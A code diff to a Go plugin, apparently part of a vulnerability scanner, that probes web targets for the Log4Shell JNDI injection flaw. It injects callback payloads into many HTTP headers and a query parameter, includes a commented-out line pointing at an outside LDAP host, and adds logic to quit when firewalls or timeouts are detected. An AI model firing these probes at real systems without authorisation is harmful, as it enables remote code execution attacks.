@@ -96,7 +96,12 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	//}
 	// fmt.Println(randStr)
 
+	timeOutCount := 0
+	normalRequestCount := 0
+	totalCount :=0
+
 	for _, payload := range payloads {
+		// fullPayload := payload
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
 		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/by9aum}", payload)
 		for _, reqPath := range reqPaths {
@@ -110,6 +115,11 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 				}
 				// fmt.Println(count)
 				for _, header := range headers {
+
+					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5{
+						return false
+					}
+
 					request.Header.Set(header, fullPayload)
 					request.Header.Set("User-Agent", fullPayload)
 					request.Header.Set("X-Forwarded-For", fullPayload)
@@ -131,19 +141,29 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 					request.Header.Set("X-Api-Version", fullPayload)
 					request.Header.Set("TraceID", fullPayload)
+
+					totalCount++
 					resp, err := util.RequestDo(request, false)
 
 					// 存在腾讯门神防火墙或者华为防火墙的情况下执行return false
-					if &resp != nil && err == nil && resp.Other != nil {
-						if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
-							return false
+					if &resp != nil && err == nil {
+						if resp.Other != nil {
+							normalRequestCount++
+							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
+								return false
+							}
 						}
+					} else if err != nil {
+						timeOutCount++
 					}
 
 				}
 
 				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
 				for _, header := range headers {
+					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5{
+						return false
+					}
 					request.Header.Set(header, fullPayload)
 					request.Header.Set("User-Agent", fullPayload)
 					request.Header.Set("X-Forwarded-For", fullPayload)
@@ -165,7 +185,19 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 					request.Header.Set("X-Api-Version", fullPayload)
 					request.Header.Set("TraceID", fullPayload)
-					_, _ = util.RequestDo(request, false)
+
+					totalCount++
+					resp, err := util.RequestDo(request, false)
+					if &resp != nil && err == nil {
+						normalRequestCount++
+						if resp.Other != nil {
+							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
+								return false
+							}
+						}
+					} else if err != nil {
+						timeOutCount++
+					}
 				}
 				// fmt.Println(count)
 				// count++
